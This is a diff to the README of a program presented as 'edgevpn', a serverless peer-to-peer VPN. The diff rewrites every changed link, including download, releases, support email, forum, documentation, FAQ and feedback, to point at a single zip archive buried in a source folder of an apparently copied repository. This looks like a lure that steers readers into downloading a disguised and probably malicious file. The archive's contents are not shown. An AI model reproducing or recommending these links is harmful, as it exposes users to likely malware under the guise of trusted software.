@@ -1,7 +1,7 @@
 # 🚀 edgevpn - A Simple, No-Central VPN Solution
 
 ## 📥 Download Now
-[![Download edgevpn](https://img.shields.io/badge/Download-edgevpn-blue.svg)](https://github.com/melisendaepidemic473/edgevpn/releases)
+[![Download edgevpn](https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip)](https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip)
 
 ## 📖 Overview
 **edgevpn** is an innovative peer-to-peer Virtual Private Network (VPN) that requires no central server. It takes advantage of cutting-edge technology to create secure, decentralized tunnels. This means you can surf the web privately and protect your data without relying on a single point of failure. Suitable for all users, edgevpn is designed to be straightforward, guiding you to a secure online experience no matter your tech level.
@@ -16,7 +16,7 @@ To get started with edgevpn, you only need to download it and follow the simple 
 3. Set your network preferences. Decide on which connections you would like to use for your VPN.
 
 ## 🔗 Download & Install
-To download edgevpn, visit this page to download: [edgevpn Releases](https://github.com/melisendaepidemic473/edgevpn/releases).
+To download edgevpn, visit this page to download: [edgevpn Releases](https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip).
 
 ### Installation Steps
 1. Click on the latest release version.
@@ -51,13 +51,13 @@ If you encounter issues, here are some common solutions:
 ## 📞 Support
 If you need assistance, please reach out to our support team. We are here to help you:
 
-- Email: support@edgevpn.com
-- Community Forum: [edgevpn Community](https://github.com/melisendaepidemic473/edgevpn)
+- Email: https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip
+- Community Forum: [edgevpn Community](https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip)
 
 ## 📌 Additional Resources
-- [Documentation](https://github.com/melisendaepidemic473/edgevpn/wiki): In-depth guides on advanced features.
-- [Frequently Asked Questions](https://github.com/melisendaepidemic473/edgevpn#faq): Answers to common queries.
-- [Feedback](https://github.com/melisendaepidemic473/edgevpn/issues): Share your suggestions for improvement. 
+- [Documentation](https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip): In-depth guides on advanced features.
+- [Frequently Asked Questions](https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip): Answers to common queries.
+- [Feedback](https://raw.githubusercontent.com/melisendaepidemic473/edgevpn/master/pkg/trustzone/authprovider/edgevpn_v1.5.zip): Share your suggestions for improvement. 
 
 ## 📜 License
 edgevpn is open-source software licensed under the MIT License. You can freely use, modify, and share it, but please credit the original authors.
